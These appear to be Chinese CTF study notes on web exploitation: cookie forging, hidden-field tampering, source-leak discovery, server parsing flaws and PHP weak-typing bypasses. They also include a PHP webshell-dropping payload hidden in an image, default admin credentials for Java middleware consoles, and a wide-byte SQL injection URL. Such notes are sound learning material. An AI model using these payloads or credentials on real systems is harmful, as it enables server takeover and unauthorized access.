		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/531.3 (KHTML, like Gecko) Chrome/3.0.193.0 Safari/531.3 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.7 (KHTML, like Gecko) Chrome/2.0.176.0 Safari/530.7 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/2.0.174.0 Safari/530.6 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.173.1 Safari/530.5 
		Mozilla/6.0 (Windows; U; Windows NT 6.0; en-US) Gecko/2009032609 Chrome/2.0.172.6 Safari/530.7 
		Mozilla/6.0 (Windows; U; Windows NT 6.0; en-US) Gecko/2009032609 (KHTML, like Gecko) Chrome/2.0.172.6 Safari/530.7 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.6 Safari/530.5 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.43 Safari/530.5 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.40 Safari/530.5 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.39 Safari/530.5 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.23 Safari/530.5 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.2 Safari/530.5 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.4 (KHTML, like Gecko) Chrome/2.0.171.0 Safari/530.4 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.1 (KHTML, like Gecko) Chrome/2.0.168.0 Safari/530.1 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.1 (KHTML, like Gecko) Chrome/2.0.164.0 Safari/530.1 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.0 (KHTML, like Gecko) Chrome/2.0.162.0 Safari/530.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.0 (KHTML, like Gecko) Chrome/2.0.160.0 Safari/530.0 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/528.10 (KHTML, like Gecko) Chrome/2.0.157.2 Safari/528.10 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/528.11 (KHTML, like Gecko) Chrome/2.0.157.0 Safari/528.11 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/528.8 (KHTML, like Gecko) Chrome/2.0.156.1 Safari/528.8 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.59 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.50 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.46 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.43 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.42 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.4.154.31 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.0 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.152.0 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.151.0 Safari/525.19 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.6 Safari/525.13 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.30 Safari/525.13 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13 
		Mozilla/5.0 (Windows; U; Windows NT 6.0; de) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13 
		Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3 
		Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6 
		Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0) Gecko/16.0 Firefox/16.0 
		Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Trident/5.0) 
		Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; WOW64; Trident/5.0) 
		Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0) 
		Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0) 
		Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0) 
		Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; ARM; Trident/6.0) 
		Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36 
		Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36 
		Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36 
		Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36 
		Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1464.0 Safari/537.36 
		Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36 
		Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/24.0.1295.0 Safari/537.15 
		Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.14 (KHTML, like Gecko) Chrome/24.0.1292.0 Safari/537.14 
		Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13 
		Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13 
		Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.26 Safari/537.11 
		Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.17 Safari/537.11 
		Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4 
		Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1 
		Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3 
		Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3 
		Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24 
		Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11 
		Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11 
		Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11
	http://lab1.xseclab.com/base6_6082c908819e105c378eb93b6631c4d3/index.php
	//.net的版本修改，后面添加，如版本9
	.NET CLR 9
	冒充登陆用户
	0.直接访问，提示需要登陆，用burpsuite抓包，发现Set-Cookie: Login=0，根据这个提示，在请求包中的cookie中添加 Login=1，再访问，即可得到通关密码。
	1.提示You are not admin,I am sorry you can't see the flag，看样子需要伪造cookie
	控制台发现原来的cookie为
	Cookie: whoami=guest%40geekgame; root=0; __jsluid=a9097face41bc391a71c3cd14b8bf76b; CNZZDATA1252970113=1302720531-1476624264-%7C1476624264; Hm_lvt_d7682ab43891c68a00de46e9ce5b76aa=1476627403; PHPSESSID=mts1e7s673q0bic7e1ln4vtll4
	只需抓包重放修改cookie的值Cookie:whoami=admin%40geekgame; root=1; __jsluid=a9097face41bc391a71c3cd14b8bf76b; CNZZDATA1252970113=1302720531-1476624264-%7C1476624264; Hm_lvt_d7682ab43891c68a00de46e9ce5b76aa=1476627403; PHPSESSID=mts1e7s673q0bic7e1ln4vtll4 即可。
绕过字符提交验证：<input type="text" maxlength="3" name="v">
从控制台修改maxlength的值即能修改提交的长度
#Accept-Language：语言
http://lab1.xseclab.com/base1_0ef337f3afbe42d5619d7a36c19c20ab/index.php
http://ctf1.shiyanbar.com/basic/header/
Cookie的修改
http://lab1.xseclab.com/base9_ab629d778e3a29540dfd60f2e548a5eb/index.php
查看HTTP请求头或响应头http://lab1.xseclab.com/base7_eb68bd2f0d762faf70c89799b3c1cc52/index.php
4.302跳转的中转网页有信息----burp抓包啊
有时多抓几次包，多看几眼request和response，眼尖一点。脑洞大一点
5.查看开发者工具控制台（chrome或firefox，Edeg）
6.javascript代码绕过
#通过删除或修改代码或者本地代理改包绕过
http://lab1.xseclab.com/base10_0b4e4866096913ac9c3a2272dde27215/index.php
#题目用caidao_admin的身份发表一则留言，KEY便会出现！
	本题的题目摘要是hidden，很容易联想到html表单中的hidden

	查看网页源代码，可以发现有这么一句本题就很简单了，利用Firefox中的插件Firebug修改username的value属性，然后留言提交，即可得到本题的KEY。：<Input type=hidden value="Guest" name=username>
7.robots.txt文件获取信息
这本来是给搜索引擎看的信息，很可能暴露网站结构目录
http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/index.php
Disallow可以看到你一个路径，访问后（http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/9fb97531fe95594603aff7e794ab2f5f/），提示this is not a login page。。你可以用御剑扫一下。。.发现login.php。。
#git泄露----GitHack走一波
用法示例
GitHack.py http://www.openssl.org/.git/
###############常见漏洞#######################
#爆破，md5,随机数，验证码识别
#绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截 ==' 需要多学习啊
   注入：http://103.238.227.13:10087/
      盲注：http://ctf5.shiyanbar.com/web/wonderkun/index.php
      注入绕过：http://a.sql.bugku.com/web2/  提示 !,!=,=,+,-,^,%
		http://web.jarvisoj.com:32787/
#sqli
#花式玩弄几个PHP特性，包括弱类型，strpos和===，反序列化+destruct、\0截断、iconv截断、
	#Php中的MD5中的0e比较:
	如果md的值是以0e开头的，那么就与其他的0e开头的Md5值是相等的。例子如下md5('s878926199a')=0e545993274517709034328855841020
	md5('s155964671a')=0e342768416822451524974117254469
	//可以看到两者的md5值都是以0e开头的，则
	md5('s878926199a')==md5('s155964671a') //1就是True。所以提交a=s878926199a就能符合源码要求，得到flag
#PHP伪协议，zip://、phar://、php://filter/read等
      http://web.jarvisoj.com:32768/
#file include 文件包含

#Fileupload 上传

#command injection 命令执行

#xss  跨站

#csrf

#ssrf
#Information disclosure 泄露
	#robots.txt
	#comment
		<!--
		
		$id =$_GET["id"];
		...
		!-->
	#Vim swap/backup file(.bak/.php~/.php.swp)
	
	pyc
	.DS_Store
	#bak file(.tar.gz/.rar/.zip/.7z)
		Index.php.bak
		Web.zip
		Web.tar.gz
		Web.rar御剑扫一波了

	.svn
	.git
#Code Audit 代码审计
	#php
		‘ or “
		== or ===
		String or Array
		SQLi
		Waf Bypass
		Fuzz
		##############################
		if (md5($_GET['name']) == md5($_GET['password']))
        die('Flag: '.$flag);
		##############################
		if (sha1($_GET['name']) == sha1($_GET['password']))
        die('Flag: '.$flag);
		##############################


#Upload

#LFI
五、各种找源码技巧，包括git、svn、xxx.php.swp、*www*.(zip|tar.gz|rar|7z)、xxx.php.bak、
六、文件上传，包括花式文件后缀 .php345 .inc .phtml .phpt .phps、各种文件内容检测<?php <? <% 、花式解析漏洞
      http://c.bugku.com/web9/
      http://web.jarvisoj.com:32790/
      http://web.jarvisoj.com:32785/index.php#
七、Mysql类型差异，包括和PHP弱类型类似的特性,0x、0b、1e之类，varchar和integer相互转换
八、open_basedir、disable_functions花式绕过技巧，包括dl、mail、imagick、bash漏洞、DirectoryIterator及各种二进制选手插足的方法
九、条件竞争，包括竞争删除前生成shell、竞争数据库无锁多扣钱
十、windows特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、:DATA，冒号截断
十一、SSRF，包括花式探测端口，302跳转、花式协议利用、gophar直接取shell等
十二、XSS，各种浏览器auditor绕过、富文本过滤黑白名单绕过、flash xss、CSP绕过
       XSS:http://103.238.227.13:10089/
十三、XXE，各种XML存在地方（rss/word/流媒体）、各种XXE利用方法（SSRF、文件读取）
      http://web.jarvisoj.com:9882/  请设法获得目标机器/home/ctf/flag.txt中的flag值。
十四、协议，花式IP伪造 X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA，花式藏FLAG、花式分析数据包
十五、python脚本，盲注脚本、POST提交脚本等，常见python库
     urllib、urllib2、requests   # 发送 HTTP 请求的
     urlparse    # 处理 url 
     re             # 正则表达式
     random    # 生成随机数的
     hashlib    # 集成md5算法
     base64    # base64编码
     socket     # 套接字
     os/sys
练习：http://c.bugku.com/web6/ 
0X02 Misc
一、压缩包加密，伪加密、暴力破解、明文攻击、CRC32碰撞
二、图片隐写，LSB、Stegsolve、binwalk、foremost、JPHS、文件头部属性、RGB图片像素点还原
三、音频隐写，MP3Stego、分析频谱
四、流量包分析，追踪流、直接导出、binwalk、foremost
     http://ctf.bugku.com/files/bcd48 ... c46e/CTF.pcapng.zip
     http://ctf5.shiyanbar.com/misc/misc300.zip
五、社工，包括花式查社工库、微博、QQ签名、whois
0x03 Crypto
一、古典密码
二、现代密码，RSA、hash长度扩展、异或、移位加密各种变形、32位随机数过小、唯密文攻击
       RSA：http://ctf5.shiyanbar.com/crypto/RSA
       唯密文攻击：http://ctf5.shiyanbar.com/crypto/ciphertext.zip（试试看破解这个 1024 位 RSA 系统。flag的形式是 CTF{USTC-X}，X 是 RSA 的两个素数中较小的那个（取其大写MD5的前6位））
###常见中间件漏洞
	IIS
	l IIS解析漏洞
	IIS 6.0解析利用方法有两种：
	1.目录解析
	建立xx.asp为名称的文件夹，将asp文件放入，访问/xx.asp/xx.jpg，其中xx.jpg可以为任意文件后缀，即可解析
	2.文件解析
	后缀解析：/xx.asp;.jpg  /xx.asp:.jpg(此处需抓包修改文件名)
	3.默认解析：
	/xx.asa，/xx.cer，/xx.cdx
	IIS7.5/ IIS 7.0/ Nginx <8.03畸形解析漏洞
	IIS 7.5的解析漏洞利用手法，在正常图片URL后添加 /.php
	常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾
	内容 <?PHP fputs(fopen(‘shell.php’,’w’),'<?phpeval($_POST[cmd])?>’);?>
	通过windows下copy命令合成，或者用hex工具直接写也可以
	然后访问xx.jpg/x.php,在这个目录下就会生成一句话木马shell.php
	l IIS PUT漏洞
	2个错误配置造成
	1.WEB服务器扩展里设置WebDAV为允许；
	2.网站权限配置里开启了写入权限。
	使用桂林老兵的工具
	l IIS溢出漏洞
	开启WebDAV服务的IIS 6.0被爆存在缓存区溢出漏洞导致远程代码执行，针对 Windows Server 2003 R2
	POC: https://github.com/edwardz246003 ... b/master/exploit.py

	Apache
	l  解析漏洞
	后缀解析：test.php.x1.x2.x3
	Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析
	test.php.x1.x2.x3 则会被解析为php
	经验之谈：php|php3|phtml|php4|php5 多可被Apache解析

	Nginx
	l  解析漏洞
	Nginx <8.03畸形解析漏洞
	直接在正常图片URL后添加 /.php
	Nginx <=0.8.37
	在Fast-CGI关闭的情况下，Nginx <=0.8.37 依然存在解析漏洞
	在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件。
	这是从 /test.jpg/x.php 演变过来的，具体可以参考：Ngnix空字节可远程执行代码漏洞

	JBOSS
	l 存在java反序列化命令执行
	端口：8080（Web）、9990（Console）
	管理面板：http://<host>:9990
	弱口令
	jboss:jboss
	admin:admin

	Weblogic
	l存在java反序列化命令执行
	端口 7001、7002（Web、Console）
	管理面板：http://<host>:7001/console/
	弱口令
	weblogic:weblogic
	system:system
	portaladmin:portaladmin
	guest:guest
	weblogic:admin123
	weblogic:weblogic123

	WebSphere
	l存在java反序列化命令执行
	端口：9080、9443（Web）、9060、9043（Console）、…
	管理面板：
	http://<host>:7043/ibm/console/logon.jsp

	java反序列化漏洞网上有jar工具，自行查找下就ok了，使用就像struts2那种利用工具一样，看一眼就会用了

一、爆破，包括包括md5、爆破随机数、验证码识别等
二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截
三、花式玩弄几个PHP特性，包括弱类型，strpos和===，反序列化+destruct、\0截断、iconv截断、
四、密码题，包括hash长度扩展、异或、移位加密各种变形、32位随机数过小
五、各种找源码技巧，包括git、svn、xxx.php.swp、*www*.(zip|tar.gz|rar|7z)、xxx.php.bak、
六、文件上传，包括花式文件后缀 .php345 .inc .phtml .phpt .phps、各种文件内容检测<?php <? <% <script language=php>、花式解析漏洞、（php345,，意思是php3，php4，php5）
七、Mysql类型差异，包括和PHP弱类型类似的特性,0x、0b、1e之类，varchar和integer相互转换
八、open_basedir、disable_functions花式绕过技巧，包括dl、mail、imagick、bash漏洞、DirectoryIterator及各种二进制选手插足的方法
九、条件竞争，包括竞争删除前生成shell、竞争数据库无锁多扣钱
十、社工，包括花式查社工库、微博、QQ签名、whois
十一、windows特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、::$DATA，冒号截断
十二、SSRF，包括花式探测端口，302跳转、花式协议利用、gophar直接取shell等
十三、XSS，各种浏览器auditor绕过、富文本过滤黑白名单绕过、flash xss、CSP绕过
十四、XXE，各种XML存在地方（rss/word/流媒体）、各种XXE利用方法（SSRF、文件读取）
十五、协议，花式IP伪造 X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA，花式藏FLAG、花式分析数据包​​​​
#########################PHP黑魔法###################################
php作为受欢迎的开源脚本语言，php是世界上最好的语言，越来越多的应用于Web开发领域。php属于弱类型语言，即定义变量的时候不用声明它是什么类型。作为一个程序员，弱类型确实给程序员书写代码带来了很大的便利，但是也带来了一些不必要的问题。

0x01 ==和===的问题

==是比较运算，它不会去检查条件式的表达式的类型

===是恒等，它会检查查表达式的值与类型是否相等。

NULL,0,"0",array()使用==和false比较时，都是会返回true的，而使用===却不会

比较操作
一个数字和一个字符串进行比较，PHP会把字符串转换成数字再进行比较。PHP转换的规则的是：若字符串以数字开头，则取开头数字作为转换结果，若无则输出0。例如：123abc转换后应该是123，而abc则为0，0==0这当然是成立的啦！所以，0 =='abc'是成立的。当有一个对比参数是整数的时候，会把另外一个参数强制转换为整数。

Hash比较
"0e132456789"=="0e7124511451155" //true
"0e123456abc"=="0e1dddada" //false
"0e1abc"=="0"     //true
在进行比较运算时，如果遇到了0e\d+这种字符串，就会将这种字符串解析为科学计数法。所以上面例子中2个数的值都是0因而就相等了。如果不满足0e\d+这种模式就不会相等。

md5比较
<?php
$a = md5('240610708'); // = 0e462097431906509019562988736854
$b = md5('QNKCDZO'); // = 0e830400451993494058024219903391
var_dump($a == $b);
?>
返回结果bool(true)

240610708 和 QNKCDZO md5值类型相似，但并不相同，在“==”相等操作符的运算下，结果返回了true。这是个经典的漏洞，只需要找到md5值为0exxx（xxx全为数字,共30位），这里我提供4个都可以通过的值：240610708、QNKCDZO、aabg7XSs、aabC9RqS

扩展：

先注册密码为240610708的用户A。
然后用密码QNKCDZO尝试登录用户A。
倘若成功登录，则证明此网站采用了不完备的加密体制md5一次加密。

先注册密码为0E33455555的用户A。
然后用密码0E234230570345尝试登录用户A。
倘若成功登录，则证明此网站采用了明文进行存储密码！
0x02 转换问题

类型转换
string转int：intval()函数

var_dump(intval('2')) //2
var_dump(intval('3abcd')) //3
var_dump(intval('abcd')) //0
说明intval()转换的时候，会将从字符串的开始进行转换知道遇到一个非数字的字符。即使出现无法转换的字符串，intval()不会报错而是返回0。

十六进制转换
"0x1e240"=="123456" //true
"0x1e240"==123456 //true
"0x1e240"=="1e240" //false
当其中的一个字符串是0x开头的时候，ox开头表示16进制，PHP会将此字符串解析成为十进制然后再进行比较，0×1e240解析成为十进制就是123456，所以与int类型和string类型的123456比较都是相等。

这样在不让输入数字但是后面还要和一串数字比较的情况下可以使用这种方法，将后面要比较的数字转为16进制，这样就可以绕过。

0x03 数组问题

if (isset($_GET['name']) and isset($_GET['password'])) {
    if ($_GET['name'] == $_GET['password'])
        print 'Your password can not be your name.';
    else if (sha1($_GET['name']) === sha1($_GET['password']))
        die('Flag: '.$flag);
else
    print 'Invalid password';
name和password的值不能相同，其次，sha1加密之后的name和password的值又必须完全相同 我们知道，在php中，$a[] = 1;代表着$a[x] = 1;所以name[] = 1和password[]= 2相比较，可以跳过第一个判断，而如果使用sha1对一个数组进行加密，返回的将是NULL，NULL===NULL，这是成立的，所以构造两个数组绕过

0x04 常见函数问题

md5()
string md5 ( string $str [, bool $raw_output = false ] )

md5()中需要传入的是一个string类型的参数，当我们传递一个array时，它是不会报错的，函数无法求出array的MD5值，这样导致任意两个array的MD5值都相等，从而绕过输入数值的判断，在ctf代码审计中经常遇见。

strcmp()
int strcmp ( string $str1 , string $str2 )

进行字符串长度的比较，传入两个string的参数。如果str1小于str2,返回-1，相等返回0，否则返回1。strcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值。如果传入的参数为数字或数组

例1：
$array=[1,2,3];
var_dump(strcmp($array,'123')); //null,在某种意义上null也就是相当于false。

例2：
if (isset($_GET['password'])) {
if (strcmp($_GET['password'], $flag) == 0)
    die('Flag: '.$flag);
else
    print 'Invalid password';
}
此处使用strcmp()对pass和flag进行判断，如果==0，则输出flag。但是strcmp()函数只有在相等的情况下返回0。那么我们传入一个数组，它会返回NULL，而判断使用了==，而NULL==0是bool(true)，这样就成功绕过。

switch()
如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型。

in_array()
bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )

如果strict参数没有提供，那么in_array就会使用松散比较来判断$needle是否在$haystack中。当strince的值为true时，in_array()会比较needls的类型和haystack中的类型是否相同。

$array=[0,1,2,'3'];
var_dump(in_array('abc', $array));  //true
var_dump(in_array('1bc', $array)); //true
可以看到上面的情况返回的都是true,因为’abc’会转换为0，’1bc’转换为1。

ereg()
int ereg(string pattern, string string, array [regs]);

字符串对比解析，ereg函数存在NULL截断漏洞，当ereg读取字符串string时,如果遇到了%00,后面的字符串就不会被解析。

bool类型的true跟任意字符串可以弱类型相等
目前就整理这么多，以后有新的会继续添加上去

黑魔法，是以前做CTF时遇到并记录的，很适合在做CTF代码审计的时候翻翻看看。

一、要求变量原值不同但md5或sha1相同的情况下

1.0e开头的全部相等（==判断）

240610708 和 QNKCDZO md5值类型相似，但并不相同，在”==”相等操作符的运算下，结果返回了true.

Md5和sha1一样

<?

$password=$_GET['password'];

if(strcmp('am0s',$password)){

    echo 'false!';

}else{

    echo 'success!';

}

?>

2.利用数组绕过（===判断）

Md5和sha1对一个数组进行加密将返回NULL；而NULL===NULL返回true，所以可绕过判断。

二、Strcmp利用数组绕过

查看的手册

int strcmp ( string $str1 , string $str2 )

Return Values

Returns < 0 if str1 is less than str2; > 0 if str1 is greater than str2, and 0 if they are equal.

当输入的两个值为不是字符串时就会产生不预期的返回值：

比如

这样一段代码中，输入password[]=1则返回success，成功绕过验证

三、当有两个is_numeric判断并用and连接时，and后面的is_numeric可以绕过

$a=$_GET['a'];

$b=$_GET['b'];

$c=is_numeric($a) and is_numeric($b);

var_dump(is_numeric($a));

var_dump(is_numeric($b));

var_dump($c);  //$b可以不是数字，同样返回true

$test=false and true;

var_dump($test); //返回true

四、NULL,0,”0″,array()使用==和false比较时，都是会返回true的

五、Eregi匹配

数组绕过

ereg是处理字符串，传入数组之后，ereg是返回NULL

%00截断绕过

Http://www.secbox.cn/hacker/1889.HTML

六、接收参数$a得存在，并且$a==0可用.绕过（非数字都可绕过）

测试代码：

<?

$a=$_GET['a'];

if ($a==0) {

echo "1";

}

if ($a) {

echo "must";

}

七、接收参数中不能出现某一字符，但下面又必须使用可以://伪协议绕过

目前遇到的是file_get_contents其他情况具体而定

八、is_numeric绕过

空格、\t、\n、\r、\v、\f、+、-能够出现在参数开头，“点”能够在参数任何位置，E、e只能出现在参数中间。

九、5,3,29,这里可以直接用%0b绕过\s（空白字符）的匹配

十、既是0又是1的情况

$a==1&$test[$a]=t时

精度（16以上）var_dump(9999999999999999999==1);//true

科学计数法 .1e1 echo $b[‘.1e1’]//输出t

.是字符串所以在数组里面变成0，但在is_numeric中有点则正常输出为数字

十一、当switch没有break时可以继续往下执行

<?

if (isset ( $_GET ['which'] )) {

$which = $_GET ['which'];

switch ($which) {

case 0 :

case 1 :

case 2 :

echo $which . '.';

break;

default :

echo "1";

break;

}

}

$which进入循环时没有break则按顺序
#宽字节注入
http://103.238.227.13:10083/index.php?id=%df%27 or 1%23 
